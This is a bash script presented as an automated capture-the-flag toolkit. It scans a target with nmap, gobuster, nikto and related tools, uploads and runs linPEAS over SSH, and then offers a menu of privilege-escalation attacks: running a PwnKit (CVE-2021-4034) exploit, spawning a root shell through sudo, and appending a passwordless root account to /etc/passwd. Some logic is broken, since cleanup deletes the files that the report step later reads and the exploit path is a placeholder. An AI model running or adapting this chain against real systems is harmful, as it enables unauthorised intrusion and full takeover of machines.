#!/bin/bash

set -e
set -o pipefail

LOGFILE="ctf_toolkit.log"
REPORT="ctf_report.txt"
TEMP_DIR=$(mktemp -d)
SSH_KEY=""
TARGET_IP=""
LOCAL_IP=""

# ASCII Art functions
display_start_art() {
    echo "................................................................"
    echo "..####...##..##..######...####............####...######..######."
    echo ".##..##..##..##....##....##..##..........##..##....##....##....."
    echo ".######..##..##....##....##..##..........##........##....####..."
    echo ".##..##..##..##....##....##..##..........##..##....##....##....."
    echo ".##..##...####.....##.....####............####.....##....##....."
    echo "................................................................"
    echo "                          Automated CTF Toolkit - Atari65xe"
}

display_nmap_art() {
    echo "  _   _"                       
    echo " | \ | |_ __ ___   __ _ _ __  "
    echo " |  \| | '_ ` _ \ / _` | '_ \ "
    echo " | |\  | | | | | | (_| | |_) |"
    echo " |_| \_|_| |_| |_|\__,_| .__/ "
    echo "         Nmap Scan.    |_|    "
}

display_enum4linux_art() {
    echo "  ______                          _  _    _       _                     "
    echo " |  ____|                        | || |  | |     (_)                    "
    echo " | |__    _ __   _   _  _ __ ___ | || |_ | |      _  _ __   _   _ __  __"
    echo " |  __|  | '_ \ | | | || '_ ` _ \|__   _|| |     | || '_ \ | | | |\ \/ /"
    echo " | |____ | | | || |_| || | | | | |  | |  | |____ | || | | || |_| | >  < "
    echo " |______||_| |_| \__,_||_| |_| |_|  |_|  |______||_||_| |_| \__,_|/_/\_\"
    echo "          Enum4linux-ng Scan"
}

display_gobuster_art() {
    echo "   ____       ____            _            "
    echo "  / ___| ___ | __ ) _   _ ___| |_ ___ _ __ "
    echo " | |  _ / _ \|  _ \| | | / __| __/ _ \ '__|"
    echo " | |_| | (_) | |_) | |_| \__ \ ||  __/ |   "
    echo "  \____|\___/|____/ \__,_|___/\__\___|_|   "
    echo "          Gobuster Scan"
}

display_nikto_art() {
    echo "  _   _ _ _    _        "
    echo " | \ | (_) | _| |_ ___  "
    echo " |  \| | | |/ / __/ _ \ "
    echo " | |\  | |   <| || (_) |"
    echo " |_| \_|_|_|\_\\__\___/ "
    echo "           Nikto Scan"
}

display_dirb_art() {
    echo "  ____  _      _     "
    echo " |  _ \(_)_ __| |__  "
    echo " | | | | | '__| '_ \ "
    echo " | |_| | | |  | |_) |"
    echo " |____/|_|_|  |_.__/ "
    echo "         Dirb Scan"
}

display_priv_esc_art() {
    echo "   ____       _       _____          "
    echo "  |  _ \ _ __(_)_   _| ____|___  ___ "
    echo "  | |_) | '__| \ \ / /  _| / __|/ __|"
    echo "  |  __/| |  | |\ V /| |___\__ \ (__ "
    echo "  |_|   |_|  |_| \_/ |_____|___/\___|"
    echo "       linPEAS - Privilege Escalation"
}

display_flag_search_art() {
    echo "  _____ _             "
    echo " |  ___| | __ _  __ _ "
    echo " | |_  | |/ _` |/ _` |"
    echo " |  _| | | (_| | (_| |"
    echo " |_|   |_|\__,_|\__, |"
    echo "                |___/ "
    echo "       Flag Search"
}

# Usage function
usage() {
    echo "Usage: $0 -t <target_ip> -l <local_ip> [-k <ssh_key>]"
    exit 1
}

# Log function
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a $LOGFILE
}

# Check for required tools
check_tools() {
    for tool in /usr/bin/nmap /bin/nc /usr/bin/ssh /usr/bin/scp /usr/bin/enum4linux-ng /usr/bin/gobuster /usr/bin/nikto /usr/bin/dirb /usr/bin/gcc; do
        if ! command -v $tool &> /dev/null; then
            log "[!] $tool is required but not installed. Please install it and try again."
            exit 1
        fi
    done
}

# Trap signals for cleanup
trap cleanup EXIT INT TERM

# Run nmap scan
nmap_scan() {
    display_nmap_art
    log "[*] Running nmap scan on $TARGET_IP..."
    /usr/bin/nmap -A -T4 $TARGET_IP -oN nmap_scan.txt
    log "[*] Nmap scan saved to nmap_scan.txt"
}

# Run enum4linux-ng scan
enum4linux_scan() {
    display_enum4linux_art
    log "[*] Running enum4linux-ng scan on $TARGET_IP..."
    /usr/bin/enum4linux-ng -A $TARGET_IP > enum4linux-ng_scan.txt
    log "[*] Enum4linux-ng scan saved to enum4linux-ng_scan.txt"
}

# Run gobuster scan
gobuster_scan() {
    display_gobuster_art
    log "[*] Running gobuster scan on $TARGET_IP..."
    /usr/bin/gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_scan.txt
    log "[*] Gobuster scan saved to gobuster_scan.txt"
}

# Run nikto scan
nikto_scan() {
    display_nikto_art
    log "[*] Running nikto scan on $TARGET_IP..."
    /usr/bin/nikto -h http://$TARGET_IP -o nikto_scan.txt
    log "[*] Nikto scan saved to nikto_scan.txt"
}

# Run dirb scan
dirb_scan() {
    display_dirb_art
    log "[*] Running dirb scan on $TARGET_IP..."
    /usr/bin/dirb http://$TARGET_IP /usr/share/wordlists/dirb/common.txt -o dirb_scan.txt
    log "[*] Dirb scan saved to dirb_scan.txt"
}

# Run scans in parallel
run_scans() {
    nmap_scan &
    enum4linux_scan &
    gobuster_scan &
    nikto_scan &
    dirb_scan &
    wait
}

# Check for open ports
check_ports() {
    log "[*] Checking for open ports..."
    OPEN_PORTS=$(grep open nmap_scan.txt | cut -d '/' -f 1)
    for port in $OPEN_PORTS; do
        log "[*] Trying to connect to port $port..."
        /bin/nc -zv $TARGET_IP $port
        if [ $? -eq 0 ]; then
            log "[*] Connected to $TARGET_IP on port $port"
        else
            log "[!] Could not connect to $TARGET_IP on port $port"
        fi
    done
}

# Extract potential privilege escalation exploits
extract_exploits() {
    log "[*] Extracting potential privilege escalation exploits..."
    grep -E "CVE|exploit|interesting" linpeas_output.txt > potential_exploits.txt
    if [ -s potential_exploits.txt ]; then
        log "[*] Potential exploits saved to potential_exploits.txt"
    else
        log "[!] No potential exploits found."
    fi
}

# Interactive menu for privilege escalation
exploit_menu() {
    log "[*] Please review the potential exploits and choose one to attempt:"
    select exploit in $(cat potential_exploits.txt); do
        if [[ -n $exploit ]]; then
            log "[*] You chose: $exploit"
            log "[*] Attempting to exploit: $exploit"
            attempt_exploit "$exploit"
            break
        else
            log "[!] Invalid choice. Please select a valid exploit."
        fi
    done
}

# Attempt to exploit the chosen vector
attempt_exploit() {
    local exploit=$1
    log "[*] Executing exploit: $exploit"
    case "$exploit" in
        *"CVE-2021-4034"*)
            /usr/bin/ssh -i $SSH_KEY $TARGET_IP 'gcc /path/to/pwnkit.c -o /tmp/pwnkit && /tmp/pwnkit'
            ;;
        *"SUID binary found: /usr/bin/sudo"*)
            /usr/bin/ssh -i $SSH_KEY $TARGET_IP 'sudo -u root /bin/bash'
            ;;
        *"Interesting file with write permissions: /etc/passwd"*)
            /usr/bin/ssh -i $SSH_KEY $TARGET_IP 'echo "root::0:0:root:/root:/bin/bash" >> /etc/passwd'
            ;;
        *)
            log "[!] No predefined action for this exploit. Please execute it manually."
            ;;
    esac
    log "[*] Verifying privilege escalation..."
    /usr/bin/ssh -i $SSH_KEY $TARGET_IP 'whoami'
}

# Privilege Escalation
privilege_escalation() {
    display_priv_esc_art
    log "[*] Starting privilege escalation checks..."
    
    if [[ ! -f "linpeas.sh" ]]; then
        log "[!] linpeas.sh not found in the current directory."
        exit 1
    fi
    
    log "[*] Uploading linpeas.sh to the target machine..."
    /usr/bin/scp -i $SSH_KEY linpeas.sh $TARGET_IP:/tmp/linpeas.sh
    
    if [[ $? -ne 0 ]]; then
        log "[!] Failed to upload linpeas.sh to the target machine."
        exit 1
    fi
    
    log "[*] Running linpeas.sh on the target machine..."
    /usr/bin/ssh -i $SSH_KEY $TARGET_IP 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh > /tmp/linpeas_output.txt'
    
    if [[ $? -ne 0 ]]; then
        log "[!] Failed to run linpeas.sh on the target machine."
        exit 1
    fi
    
    log "[*] Linpeas output saved to /tmp/linpeas_output.txt on the target machine."
    log "[*] Downloading linpeas output from the target machine..."
    /usr/bin/scp -i $SSH_KEY $TARGET_IP:/tmp/linpeas_output.txt linpeas_output.txt
    
    if [[ $? -ne 0 ]]; then
        log "[!] Failed to download linpeas_output.txt from the target machine."
        exit 1
    fi
    
    log "[*] Linpeas output saved to linpeas_output.txt on the local machine."
    extract_exploits
    
    if [ -s potential_exploits.txt ]; then
        exploit_menu
    else
        log "[!] No exploits to attempt."
    fi
}

# Search for flag files
search_flag() {
    display_flag_search_art
    log "[*] Searching for flag files on the target machine..."
    /usr/bin/ssh -i $SSH_KEY $TARGET_IP 'find / -name "flag.txt" 2>/dev/null' > flag_locations.txt
    log "[*] Flag file locations saved to flag_locations.txt"
    if [[ -s flag_locations.txt ]]; then
        log "[*] Flags found at:"
        cat flag_locations.txt
        while read -r line; do
            log "[*] Content of $line:"
            /usr/bin/ssh -i $SSH_KEY $TARGET_IP "cat $line"
        done < flag_locations.txt
    else
        log "[!] No flag files found."
    fi
}

# Cleanup function to remove temporary files
cleanup() {
    log "[*] Cleaning up temporary files..."
    /usr/bin/ssh -i $SSH_KEY $TARGET_IP 'rm -f /tmp/linpeas.sh /tmp/linpeas_output.txt'
    rm -f potential_exploits.txt linpeas_output.txt flag_locations.txt
    rm -rf "$TEMP_DIR"
}

# Generate summary report
generate_report() {
    echo "CTF Toolkit Report" > $REPORT
    echo "=================" >> $REPORT
    echo "" >> $REPORT
    echo "Nmap Scan Results:" >> $REPORT
    cat nmap_scan.txt >> $REPORT
    echo "" >> $REPORT
    echo "Enum4linux-ng Scan Results:" >> $REPORT
    cat enum4linux-ng_scan.txt >> $REPORT
    echo "" >> $REPORT
    echo "Gobuster Scan Results:" >> $REPORT
    cat gobuster_scan.txt >> $REPORT
    echo "" >> $REPORT
    echo "Nikto Scan Results:" >> $REPORT
    cat nikto_scan.txt >> $REPORT
    echo "" >> $REPORT
    echo "Dirb Scan Results:" >> $REPORT
    cat dirb_scan.txt >> $REPORT
    echo "" >> $REPORT
    echo "Privilege Escalation Attempts:" >> $REPORT
    cat potential_exploits.txt >> $REPORT
    echo "" >> $REPORT
    echo "Flags Found:" >> $REPORT
    cat flag_locations.txt >> $REPORT
    echo "" >> $REPORT
    log "[*] Summary report generated at $REPORT"
}

# Parse arguments
while getopts ":t:l:k:" opt; do
    case $opt in
        t)
            TARGET_IP=$OPTARG
            ;;
        l)
            LOCAL_IP=$OPTARG
            ;;
        k)
            SSH_KEY=$OPTARG
            ;;
        *)
            usage
            ;;
    esac
done

# Check if required arguments are provided
if [ -z "$TARGET_IP" ] || [ -z "$LOCAL_IP" ]; then
    usage
fi

# Display start art
display_start_art

# Check for required tools
check_tools

# Run the functions
run_scans
check_ports
privilege_escalation
search_flag
cleanup
generate_report

log "[*] All tasks completed."
